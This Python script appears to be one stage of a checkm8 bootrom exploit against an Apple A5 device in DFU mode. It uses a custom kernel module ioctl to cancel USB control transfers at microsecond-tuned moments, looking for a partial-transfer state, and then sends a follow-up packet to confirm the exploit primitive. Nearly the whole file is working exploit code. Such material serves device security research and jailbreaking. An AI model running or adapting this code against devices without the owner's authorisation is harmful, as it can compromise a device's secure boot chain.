#!/usr/bin/env python3
"""The hrtimer LEAK campaign: kernel-timed cuts, the single remaining
route to checkm8 stage 1 on this host.

Waits for a fresh DFU dance entry (the dance's own enumeration fires the
module capture - no reset needed). Then fires RAW0_IOC_LEAK single
shots: the module submits a kernel-internal control URB and an hrtimer
defers usb_unlink_urb into work-queue context at cancel_us - the
microsecond-precision cancel userspace cannot deliver (measured 1/500
hit rate; the kernel's jitter is us-scale).

Per shot: ioctl returns (status | actual<<16). The MID-DATA CUT class
is status=cancelled with 0 < actual < 128 - the A5 phase opened and
partially served when the cancel landed. On the first cut: stop,
report, and fire the continuation witness via plain usbfs.
"""
import ctypes
import fcntl
import glob
import importlib.util
import os
import struct
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)

IOC_LEAK = (1 << 30) | (32 << 16) | (ord("R") << 8) | 4
IOC_STATE = (2 << 30) | (40 << 16) | (ord("R") << 8) | 3

HABR_LANG = 0x040A


def dfu_present():
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() == "1227":
                return True
        except OSError:
            pass
    return False


def capture_ok():
    fd = os.open("/dev/raw0", os.O_RDWR)
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    os.close(fd)
    f = struct.unpack("<QIIIIIIII", buf)
    return f[5] == 1, f[1]


def leak2(fd, setup, data_len, dir_in, cancel_us):
    """Return the encoded (status | actual<<16)."""
    cdata = (ctypes.c_ubyte * max(64, data_len))()
    txn = bytearray(struct.pack(
        "<8sIBBBBIIQ", setup, data_len, 1 if data_len else 0,
        1 if dir_in else 0, 0, 0, cancel_us, 0,
        ctypes.addressof(cdata)))
    # mutable arg + True: fcntl returns the raw ioctl int
    return fcntl.ioctl(fd, IOC_LEAK, txn, True)


def serve_probe(timeout=400):
    class Ctl(ctypes.Structure):
        _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                    ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                    ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                    ('d', ctypes.c_void_p)]
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout,
                 ctypes.cast(buf, ctypes.c_void_p))
        t0 = time.time()
        try:
            r = fcntl.ioctl(fd, 0xC0185500, ct)
            return "ret=%d %.1fms cpid=%s" % (
                r, (time.time() - t0) * 1000,
                "CPID" in buf.raw[:r].decode("utf-16le", "ignore"))
        except OSError as e:
            return "errno=%d %.1fms" % (e.errno, (time.time() - t0) * 1000)
        finally:
            os.close(fd)
    return "GONE"


def wait_dance(timeout=1200):
    if dfu_present():
        print("stale attached - power-hold + dance NOW", flush=True)
        while dfu_present():
            if time.time() > timeout:
                return False
            time.sleep(0.05)
        print("gone - dance now", flush=True)
    t0 = time.time()
    while time.time() - t0 < timeout:
        if dfu_present():
            return True
        time.sleep(0.05)
    return False


def main():
    if not wait_dance():
        print("no entry")
        return 1
    print("DFU in - settling 1.2s for capture", flush=True)
    time.sleep(1.2)
    ok, slot = capture_ok()
    print("capture=%s slot=%d" % (ok, slot), flush=True)

    rfd = os.open("/dev/raw0", os.O_RDWR)
    # preamble: is the live ROM serving?
    print("live=%s" % serve_probe(), flush=True)

    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)

    setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x80, 0x00])

    for shot in range(40):
        cancel_us = 300 + (shot % 20) * 25  # [300..775]us
        rc = leak2(rfd, setup, 0x80, True, cancel_us)
        status = rc & 0xffff
        actual = (rc >> 16) & 0xffff
        if status > 32767:
            status -= 65536
        mark = ""
        if status == -104 and 0 < actual < 128:
            mark = "  <<< MID-DATA CUT (hrtimer cut the wire at %dus)" % cancel_us
        print("shot%-3d cancel=%-3dus: status=%-5d actual=%-3d%s"
              % (shot, cancel_us, status, actual, mark), flush=True)
        if mark:
            # continuation witness on the hot cut state
            try:
                rc2, info2 = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, 0x40,
                                          b'W' * 64, abandon=False,
                                          timeout_ms=600,
                                          name='continuation')
                print("WITNESS: status=%s actual=%d << CONTINUATION ACKED"
                      % (d.STATUS_NAMES[info2[0]], info2[1]), flush=True)
            except SystemExit:
                print("WITNESS: HANG", flush=True)
            time.sleep(0.6)
            print("post: %s" % serve_probe(), flush=True)
            break
        time.sleep(0.65)
    print("CAMPAIGN END; final: %s" % serve_probe(), flush=True)
    return 0


if __name__ == "__main__":
    main()
